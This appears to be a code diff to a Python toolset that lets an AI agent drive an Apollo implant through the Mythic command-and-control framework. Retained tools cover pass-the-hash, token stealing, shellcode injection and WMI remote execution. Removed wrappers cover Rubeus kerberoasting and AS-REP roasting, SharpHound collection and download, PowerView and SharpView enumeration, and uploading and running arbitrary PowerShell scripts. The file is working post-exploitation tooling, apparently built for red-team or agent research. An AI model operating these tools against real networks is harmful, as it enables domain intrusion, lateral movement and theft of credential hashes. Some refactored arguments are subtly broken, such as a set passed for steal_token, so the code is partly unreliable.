@@ -1,14 +1,10 @@
-import tempfile
 import typing as t
 from dataclasses import dataclass
 from pathlib import Path
-from uuid import uuid4
 
-import aiofiles
-import rich
 from loguru import logger
 from mythic import mythic  # type: ignore
-from rich.panel import Panel
+from mythic.mythic import Mythic  # type: ignore
 
 from dreadnode.agent.tools import Toolset, tool_method
 
@@ -20,7 +16,7 @@ SCRIPTS_DIR = Path(__file__).resolve().parent / "scripts"
 
 @dataclass
 class Apollo(Toolset):
-    _client = None
+    _client: Mythic = None
     _callback_id: int | None = None
     _intialized: bool = False
 
@@ -76,7 +72,7 @@ class Apollo(Toolset):
         """
         Executes supplied command to the Apollo implant through the Mythic C2 framework
         """
-        logger.debug(self._rich_print(f"Executing command: {command} with args: {args}"))
+        logger.debug(f"Executing command: {command} with args: {args}")
 
         try:
             output_bytes = await mythic.issue_task_and_waitfor_task_output(
@@ -88,15 +84,15 @@ class Apollo(Toolset):
             )
         except (TimeoutError, ValueError) as e:
             output = f"An unexpected error occured when trying to execute previous command. The error is:\n\n{e}.\n. Sometimes the command just needs to be re-executed, however if already tried to re-execute the command, best to move on to another."
-            logger.warning(self._rich_print(output))
+            logger.warning(output)
             return output
 
         if not output_bytes:
             output = f"Command '{command}' returned no output."
-            logger.debug(self._rich_print(output))
+            logger.debug(output)
             return output
 
-        logger.debug(self._rich_print(f"Command output: {output}"))
+        logger.debug(f"Command output: {output}")
 
         return str(output_bytes.decode() if isinstance(output_bytes, bytes) else output_bytes)
 
@@ -147,12 +143,10 @@ class Apollo(Toolset):
 
         return await self.execute(
             command="cp",
-            args=[
-                "-source",
-                source,
-                "-dest",
-                dest,
-            ],
+            args={
+                "-source": source,
+                "-dest": dest,
+            },
         )
 
     @tool_method()
@@ -205,10 +199,7 @@ class Apollo(Toolset):
             jobkill -jid 67890
             jobkill {"jid": 12345}
         """
-        return await self.execute(
-            command="jobkill",
-            args=jid,
-        )
+        return await self.execute(command="jobkill", args={"jid": jid})
 
     @tool_method()
     async def jobs(self) -> str:
@@ -298,7 +289,7 @@ class Apollo(Toolset):
             args=commands,
         )
 
-    @tool_method()(
+    @tool_method(
         name="net_dclist",
         description="Enumerate Domain Controllers for the specified domain (or the current domain).",
     )
@@ -309,11 +300,9 @@ class Apollo(Toolset):
             "The target domain for which to enumerate Domain Controllers. Defaults to the current domain if omitted.",
         ],
     ) -> str:
-        domain = "" if not domain or "null" in domain.lower() else {"Domain": domain}
-
         return await self.execute(
             command="net_dclist",
-            args=domain,
+            args={"Domain": domain},
         )
 
     @tool_method()
@@ -376,12 +365,13 @@ class Apollo(Toolset):
 
         return await self.execute(
             command="net_shares",
-            args=computer,
+            args={"Computer": computer},
         )
 
     @tool_method()
     async def netstat(self) -> str:
         """Display active TCP/UDP connections and listening ports on the target system. This includes information about the local and remote addresses, port numbers, and connection states."""
+
         return await self.execute(command="netstat", args="")
 
     @tool_method()
@@ -416,80 +406,6 @@ class Apollo(Toolset):
         )
 
     @tool_method()
-    async def powershell_script(
-        self,
-        filename: t.Annotated[str, "File name of powershell script."],
-        script: t.Annotated[str, "Powershell script. Encoded as a raw string."],
-        entry_function: t.Annotated[
-            str,
-            "Name of the Powershell entry function to call to start execution of the script.",
-        ],
-    ) -> str:
-        """
-        Executes the supplied powershell script on a target host. Supply the powershell script as a string. The powershell script must be composed of powershell functions where one of these functions will be the entry function that will be called to start the script.
-        """
-        if not filename.endswith(".ps1"):
-            filename = f"{filename}.ps1"
-
-        # NOTE: cant use Python tempfile here as need specific filename
-        local_tmp_file = await self._write_tmp_file(filename=filename, text=script)
-
-        # 2. upload powershell script file to Mythic server
-        upload_result = await self._client.upload_file_to_mythic_server(
-            filename=local_tmp_file, reupload=True
-        )
-        await self._delete_local_file(local_tmp_file)
-        if upload_result["file_id"] is None:
-            return "Error running 'powershell_script' commmand.\n\n Attempting to upload powershell script file to Mythic led to unknown error."
-
-        pi_result = await self.powershell_import(filename)
-
-        if "will now be imported in PowerShell commands" not in pi_result:
-            return "Error running 'powershell_import' Mythic command."
-
-        return await self.powerpick(command=entry_function)
-
-    @tool_method()
-    async def powerview(
-        self,
-        command: t.Annotated[
-            str,
-            "Powerview command line arguments to supply to the powershell instance and execute.",
-        ],
-        credential_user: t.Annotated[
-            str | None, "username to execute Powerview commands as specified user"
-        ] = None,
-        credential_password: t.Annotated[
-            str | None, "password to execute Powerview commands as specified user"
-        ] = None,
-        domain: t.Annotated[
-            str | None, "domain to execute Powerview commands as specified user"
-        ] = None,
-    ) -> str:
-        """
-        Imports PowerView into Powershell (for use) and then executes the supplied command line arguments in current Powershell instance.
-
-        """
-
-        powerview_script_filename = "PowerView.ps1"
-        upload_result = await self._client.upload_file_to_mythic_server(
-            filename=SCRIPTS_DIR / powerview_script_filename,
-            reupload=False,
-        )
-        if upload_result["file_id"] is None:
-            return f"Error running 'powerview' command.\n\n Attempting to upload {powerview_script_filename} file to Mythic led to unknown error."
-        logger.info(self._rich_print(f"Uploaded {powerview_script_filename} to Mythic."))
-
-        pi_result = await self.powershell_import(filename=upload_result["filename"])
-        if "will now be imported in PowerShell commands" not in pi_result:
-            return f"Error running [COMMAND] 'powershell_import': - {pi_result}."
-
-        if all([credential_user, credential_password, domain]):
-            powerview_cmd = f"{command} -Credential (New-Object -TypeName 'System.Management.Automation.PSCredential' -ArgumentList '{domain}\\{credential_user}', (ConvertTo-SecureString -String '{credential_password}' -AsPlainText -Force))"
-
-        return await self.powerpick(command=powerview_cmd)
-
-    @tool_method()
     async def pth(
         self,
         domain: t.Annotated[
@@ -509,14 +425,11 @@ class Apollo(Toolset):
         """
         return await self.execute(
             command="pth",
-            args=[
-                "-domain",
-                domain,
-                "-username",
-                username,
-                "-password_hash",
-                password_hash,
-            ],
+            args={
+                "-domain": domain,
+                "-username": username,
+                "-password_hash": password_hash,
+            },
         )
 
     @tool_method()
@@ -564,11 +477,7 @@ class Apollo(Toolset):
         """
         Registers (loads) assembly files/commands to a Mythic agent.
         """
-        return await self.execute(
-            command="register_assembly",
-            args={"existingFile": filename},
-            fix_dependencies=False,
-        )
+        return await self.execute(command="register_assembly", args={"existingFile": filename})
 
     @tool_method()
     async def rev2self(self) -> str:
@@ -581,44 +490,6 @@ class Apollo(Toolset):
             command="rev2self",
             args="",
         )
-
-    @tool_method()
-    async def rubeus_asreproast(self) -> str:
-        """
-        Execute ASREP-Roast technique against current domain using the Rubeus tool. The technique extracts kerberos ticket-granting tickets for active directory users that dont require pre-authentication on the domain. If ticket-granting tickets can be obtained, they will be returned (in hash form)
-        ."""
-        return await self.execute(
-            command="execute_assembly", args="Rubeus.exe asreproast /format:hashcat"
-        )
-
-    @tool_method()
-    async def rubeus_kerberoast(
-        self,
-        cred_user: t.Annotated[
-            str,
-            "principal domain user to execute the command under, formatted in fqdn format: 'domain\\user'",
-        ],
-        cred_password: t.Annotated[str, "principal domain user password"],
-        user: t.Annotated[str | None, "specific domain user to target for kerberoasting"] = None,
-        spn: t.Annotated[str | None, "specific SPN to target for kerberoasting"] = None,
-    ) -> str:
-        """
-        Kerberoast a user current domain using the Rubeus tool. The tool extracts kerberos ticket-granting tickets for active directory users that have service principal names (SPNs) set. To use 'rubeus_kerberoast' tool, you must have a username and password of existing user on the active directory domain. If ticket-granting tickets for the SPN accounts can be obtained, they will be returned (in a hash format).
-        """
-        args = f"Rubeus.exe kerberoast /creduser:{cred_user} /credpassword:{cred_password} /format:hashcat"
-
-        if user is not None:
-            args += f" /user:{user}"
-
-        if spn is not None:
-            args += f" /spn:{spn}"
-
-        return await self.execute(command="execute_assembly", args=args)
-
-    @tool_method()
-    async def seatbelt(self) -> str:
-        """Performs a number of security oriented host-survey 'safety checks' relevant from both offensive and defensive security perspectives."""
-        return await self.execute(command="execute_assembly", args="Seatbelt.exe")
 
     @tool_method()
     async def set_injection_technique(
@@ -638,219 +509,6 @@ class Apollo(Toolset):
             command="set_injection_technique",
             args=technique,
         )
-
-    @tool_method()
-    async def setspn(self, args: t.Annotated[str, "Command line arguments for setspn tool"]) -> str:
-        """
-        Allows for reading, modifying, and detelting the Service Principal Names (SPN) directory property for an Active Directory (AD) account. You can use setspn to view the current SPNs for an account, reset the account's default SPNs, and add or delete supplemental SPNs.
-
-        Reference:  https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/setspn
-        """
-        return await self.powerpick(arguments=f"($sspn = setspn {args}); echo $sspn")
-
-    @tool_method()
-    async def sharphound_and_download(
-        self,
-        domain: t.Annotated[str, "domain to enumerate."],
-        ldap_username: t.Annotated[str | None, "LDAP username to use for Sharphound."] = None,
-        ldap_password: t.Annotated[str | None, "LDAP username to use for Sharphound."] = None,
-        local_filename: t.Annotated[str | None, "Filename"] = None,
-    ) -> str | dict:
-        """
-        Run sharphound on the target callback to collect Bloodhound data. Then download the
-        Bloodhound results file to a local file. "local" being wherever the agent is running.
-        """
-
-        upload_result = await self.upload(
-            filename=SCRIPTS_DIR / "SharpHound.ps1",
-            reupload=False,
-        )
-        if upload_result["file_id"] is None:
-            return "Error running command 'sharphound_and_download'.\n\n Attempting to upload powershell script file to Mythic led to unknown error."
-        logger.info(self._rich_print("Uploaded SharpHound to Mythic."))
-
-        pi_result = await self.powershell_import(filename=upload_result["filename"])
-        if "will now be imported in PowerShell commands" not in pi_result:
-            return f"Error running 'sharphound_and_download': {pi_result}"
-
-        zip_filename_marker = f"{uuid4()!s}.zip"
-        sharp_cmd = f"Invoke-BloodHound -Zipfilename {zip_filename_marker} -Domain {domain}"
-        if all([ldap_username, ldap_username]):
-            sharp_cmd += f" --ldapusername {ldap_username} --ldappassword {ldap_password}"
-
-        sharphound_result = await self.powerpick(command=sharp_cmd, timeout=120)
-
-        if "SharpHound Enumeration Completed" not in sharphound_result:
-            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharphound_result}"
-
-        sharp_results_fn = await self.powerpick(
-            command=f"(Get-ChildItem -Path .\\ -Filter '*{zip_filename_marker}').name",
-            fix_dependencies=True,
-        )
-
-        if zip_filename_marker not in sharp_results_fn:
-            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{sharp_results_fn}"
-
-        sharp_results_fn = sharp_results_fn.strip("\r\n").split("\r\n")[-1]
-
-        local_download_file = await self.download(filepath=sharp_results_fn)
-
-        if not isinstance(local_download_file, dict):
-            return f"Error running 'sharphound_and_download'.\n\n Command response:\n{local_download_file}"
-        logger.info(self._rich_print(f"Downloaded file to:{local_download_file['path']}"))
-
-        # 6. rename local file if supplied Command specified a specific filename to use
-        if local_filename:
-            Path.rename(local_download_file.path, local_filename)
-            logger.info(
-                self._rich_print(
-                    f"Renamed filename from {local_download_file.path} to {local_filename}"
-                )
-            )
-            local_download_file["path"] = str(Path(local_filename).resolve())
-            local_download_file["name"] = Path(local_download_file["path"]).name
-
-        return local_download_file
-
-    @tool_method()
-    async def sharpview(
-        self,
-        method: t.Annotated[str, "SharpView method to execute"],
-        method_args: t.Annotated[str, "arguments for the selected SharpView method"],
-    ) -> str:
-        """
-        Used to gain network situational awareness on Windows domains.
-
-        Available methods to use for the tool:
-
-        Get-DomainGPOUserLocalGroupMapping
-        Find-GPOLocation
-        Get-DomainGPOComputerLocalGroupMapping
-        Find-GPOComputerAdmin
-        Get-DomainObjectAcl
-        Get-ObjectAcl
-        Add-DomainObjectAcl
-        Add-ObjectAcl
-        Remove-DomainObjectAcl
-        Get-RegLoggedOn
-        Get-LoggedOnLocal
-        Get-NetRDPSession
-        Test-AdminAccess
-        Invoke-CheckLocalAdminAccess
-        Get-WMIProcess
-        Get-NetProcess
-        Get-WMIRegProxy
-        Get-Proxy
-        Get-WMIRegLastLoggedOn
-        Get-LastLoggedOn
-        Get-WMIRegCachedRDPConnection
-        Get-CachedRDPConnection
-        Get-WMIRegMountedDrive
-        Get-RegistryMountedDrive
-        Find-InterestingDomainAcl
-        Invoke-ACLScanner
-        Get-NetShare
-        Get-NetLoggedon
-        Get-NetLocalGroup
-        Get-NetLocalGroupMember
-        Get-NetSession
-        Get-PathAcl
-        ConvertFrom-UACValue
-        Get-PrincipalContext
-        New-DomainGroup
-        New-DomainUser
-        Add-DomainGroupMember
-        Set-DomainUserPassword
-        Invoke-Kerberoast
-        Export-PowerViewCSV
-        Find-LocalAdminAccess
-        Find-DomainLocalGroupMember
-        Find-DomainShare
-        Find-DomainUserEvent
-        Find-DomainProcess
-        Find-DomainUserLocation
-        Find-InterestingFile
-        Find-InterestingDomainShareFile
-        Find-DomainObjectPropertyOutlier
-        TestMethod
-        Get-Domain
-        Get-NetDomain
-        Get-DomainComputer
-        Get-NetComputer
-        Get-DomainController
-        Get-NetDomainController
-        Get-DomainFileServer
-        Get-NetFileServer
-        Convert-ADName
-        Get-DomainObject
-        Get-ADObject
-        Get-DomainUser
-        Get-NetUser
-        Get-DomainGroup
-        Get-NetGroup
-        Get-DomainDFSShare
-        Get-DFSshare
-        Get-DomainDNSRecord
-        Get-DNSRecord
-        Get-DomainDNSZone
-        Get-DNSZone
-        Get-DomainForeignGroupMember
-        Find-ForeignGroup
-        Get-DomainForeignUser
-        Find-ForeignUser
-        ConvertFrom-SID
-        Convert-SidToName
-        Get-DomainGroupMember
-        Get-NetGroupMember
-        Get-DomainManagedSecurityGroup
-        Find-ManagedSecurityGroups
-        Get-DomainOU
-        Get-NetOU
-        Get-DomainSID
-        Get-Forest
-        Get-NetForest
-        Get-ForestTrust
-        Get-NetForestTrust
-        Get-DomainTrust
-        Get-NetDomainTrust
-        Get-ForestDomain
-        Get-NetForestDomain
-        Get-DomainSite
-        Get-NetSite
-        Get-DomainSubnet
-        Get-NetSubnet
-        Get-DomainTrustMapping
-        Invoke-MapDomainTrust
-        Get-ForestGlobalCatalog
-        Get-NetForestCatalog
-        Get-DomainUserEvent
-        Get-UserEvent
-        Get-DomainGUIDMap
-        Get-GUIDMap
-        Resolve-IPAddress
-        Get-IPAddress
-        ConvertTo-SID
-        Invoke-UserImpersonation
-        Invoke-RevertToSelf
-        Get-DomainSPNTicket
-        Request-SPNTicket
-        Get-NetComputerSiteName
-        Get-SiteName
-        Get-DomainGPO
-        Get-NetGPO
-        Set-DomainObject
-        Set-ADObject
-        Add-RemoteConnection
-        Remove-RemoteConnection
-        Get-IniContent
-        Get-GptTmpl
-        Get-GroupsXML
-        Get-DomainPolicyData
-        Get-DomainPolicy
-        Get-DomainGPOLocalGroup
-        Get-NetGPOGroup
-        """
-        return await self.powerpick(f"Invoke-SharpView -Method {method} -Arguments {method_args}")
 
     @tool_method()
     async def shinject(self) -> str:
@@ -894,7 +552,7 @@ class Apollo(Toolset):
         """
         return await self.execute(
             command="spawnto_x64",
-            args=[path, args] if args else [path],
+            args={"-Path": path, "-Args": args} if args else {"-Path": path},
         )
 
     @tool_method()
@@ -913,7 +571,7 @@ class Apollo(Toolset):
         """
         return await self.execute(
             command="steal_token",
-            args=pid,
+            args={"-pid", pid},
         )
 
     @tool_method()
@@ -960,7 +618,7 @@ class Apollo(Toolset):
     async def wmiexecute(
         self,
         arguments: t.Annotated[str, "The command or script block to execute on the remote system."],
-    ):
+    ) -> str:
         """Execute a command on a remote system using WMI (Windows Management Instrumentation). This allows for executing commands remotely without needing to establish a direct connection.
 
         Examples:
@@ -970,48 +628,3 @@ class Apollo(Toolset):
             command="wmiexecute",
             args=arguments,
         )
-
-    async def _write_tmp_file(
-        self, filename: str, text: str | None = None, raw_bytes: bytes | None = None
-    ) -> str:
-        """creates a file, also in a temporary directory, and writes supplied contents.
-
-        Returns: absolute filepath
-        """
-        if not any([raw_bytes, text]):
-            raise TypeError("File contents, as bytes or text must be supplied.")
-
-        tmp_dir = tempfile.TemporaryDirectory(delete=False)
-        fullpath = Path(tmp_dir.name) / filename
-
-        if raw_bytes:
-            async with aiofiles.open(fullpath, mode="wb") as fh:
-                await fh.write(raw_bytes)
-        elif text:
-            async with aiofiles.open(fullpath, mode="w") as fh:
-                await fh.write(text)
-
-        return str(fullpath)
-
-    async def _delete_local_file(self, filename: str) -> None:
-        """delete a local file"""
-        try:
-            fp = Path.resolve(filename)
-            Path.unlink(fp)
-        except (FileNotFoundError, OSError) as e:
-            logger.warning(self._rich_print(f"Error trying to delete file {filename}: {e}"))
-
-    async def _delete_local_file_and_dir(self, filename: str) -> None:
-        """delete a local file and its parent directory"""
-        try:
-            fp = Path.resolve(filename)
-            Path.unlink(fp)
-            Path.rmdir(Path.parent(fp))
-        except (FileNotFoundError, OSError) as e:
-            logger.warning(
-                self._rich_print(f"Error trying to delete file and directory {filename}: {e}")
-            )
-
-    def _rich_print(self, s: str) -> str:
-        """utility for rich printing logs"""
-        return rich.print(Panel(f"[white]{s}", title="[red1]Mythic", style="red1"))
